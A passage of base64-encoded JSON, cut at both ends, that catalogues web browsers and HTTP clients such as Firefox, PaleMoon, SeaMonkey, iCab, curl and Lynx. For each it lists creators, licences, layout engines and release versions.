mtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dlY2tvXyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMjAyMC4xMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIyMSBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJFb2xpZVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJFb2xpZSBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNb3ppbGxhIEZvdW5kYXRpb25cIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Nb3ppbGxhX0ZvdW5kYXRpb25cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1QTCAyLjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Nb3ppbGxhX1B1YmxpY19MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR2Vja29cIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJub3RlXCI6IFwiKGJlZm9yZSB2NTcpXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR2Vja29fKGxheW91dF9lbmdpbmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR2Vja28gd1xcL1NlcnZvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibm90ZVwiOiBcInY1NyAmIGFmdGVyXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvU2Vydm9fKHNvZnR3YXJlKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiU3RhbmRhcmRcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCI4Mi4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk9jdG9iZXIgMjAsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJFeHRlbmRlZCBTdXBwb3J0IFJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCI3OC40LjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiT2N0b2JlciAyMCwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlBhbGVNb29uXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlBhbGVNb29uIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1vb25jaGlsZCBQcm9kdWN0aW9uc1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTVBMIDIuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL01vemlsbGFfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHb2FubmFcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Hb2FubmFfKHNvZnR3YXJlKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiU3RhbmRhcmRcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIyOC4xNS4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIjI3IE9jdG9iZXIgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIlNlYU1vbmtleVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJTZWFNb25rZXkgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiU2VhTW9ua2V5IENvdW5jaWxcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1QTCAyLjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Nb3ppbGxhX1B1YmxpY19MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR2Vja29cIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HZWNrb18obGF5b3V0X2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YWJsZSByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMi41My40XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIlNlcHRlbWJlciAyMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIlByZXZpZXcgcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjIuNTMuNWIxXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk9jdG9iZXIgMjksIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJTYWxhbVdlYlwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJTYWxhbVdlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJTYWxhbVdlYlwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9zYWxhbXdlYi5jb21cXC9cIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkZyZWV3YXJlXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvRnJlZXdhcmVcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiV2luZG93c1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjQuNVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdWx5IDMxLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiQW5kcm9pZFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjQuNS4wLjQwXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bmUgMjUsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJtYWNPU1wiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjQuNVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdW5lIDIwLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiaU9TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiNC41XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bmUgMjAsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJmaXJlZm94XCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkZpcmVmb3ggQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTW96aWxsYSBGb3VuZGF0aW9uXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvTW96aWxsYV9Gb3VuZGF0aW9uXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNUEwgMi4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvTW96aWxsYV9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdlY2tvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibm90ZVwiOiBcIihiZWZvcmUgdjU3KVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dlY2tvXyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdlY2tvIHdcXC9TZXJ2b1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5vdGVcIjogXCJ2NTcgJiBhZnRlclwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1NlcnZvXyhzb2Z0d2FyZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YW5kYXJkXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiODIuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJPY3RvYmVyIDIwLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiRXh0ZW5kZWQgU3VwcG9ydCBSZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiNzguNC4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk9jdG9iZXIgMjAsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJHYWxlb25cIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR2FsZW9uIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1hcmNvIFBlc2VudGkgR3JpdHRpXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL3d3dy5nbm9tZS5vcmdcXC9uZXdzXFwvMjAxNVxcLzA1XFwvZ29vZGJ5ZS1tYXJjb1xcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiZGlzY29udGludWVkXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR1BMXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR05VX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHZWNrb1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dlY2tvXyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMi4wLjdcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiMjcgU2VwdGVtYmVyIDIwMDhcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJpQ2FiXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcImlDYWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQWxleGFuZGVyIENsYXVzc1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC93d3cuY2xhdXNzLW5ldC5kZVxcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWUsICQyMCAoUHJvKVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQcm9wcmlldGFyeSAoYnJvd3NlcilcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Qcm9wcmlldGFyeV9zb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkxHUEwgKFdlYktpdClcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HTlVfTGVzc2VyX0dlbmVyYWxfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJXZWJLaXRcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9XZWJLaXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjUuOS4yXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1hcmNoIDQsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJjdXJsXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkNsaWVudCBVUkxcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiRnVsbFRleHRNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiRGFuaWVsIFN0ZW5iZXJnXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvRGFuaWVsX1N0ZW5iZXJnXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJGcmVlIFNvZnR3YXJlOiBNSVRcXC9YIGRlcml2YXRlIGxpY2Vuc2VcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvY3VybC5oYXh4LnNlXFwvZG9jc1xcL2NvcHlyaWdodC5odG1sXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJTdGFibGUgcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjcuNzMuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIxNCBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJMeW54XCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkx5bnhcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIkZUUCBjbGllbnQgXFwvIEhUVFAgY2xpZW50XCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiVGV4dEJhc2VkTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1vbnR1bGxpLCBHcm9iZSwgUmV6YWMsIGV0IGFsXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHUExcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9HTlVfR2VuZXJhbF9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcImN1c3RvbSwgZm9yayBvZiBsaWJ3d3dcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9MaWJ3d3dcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IFt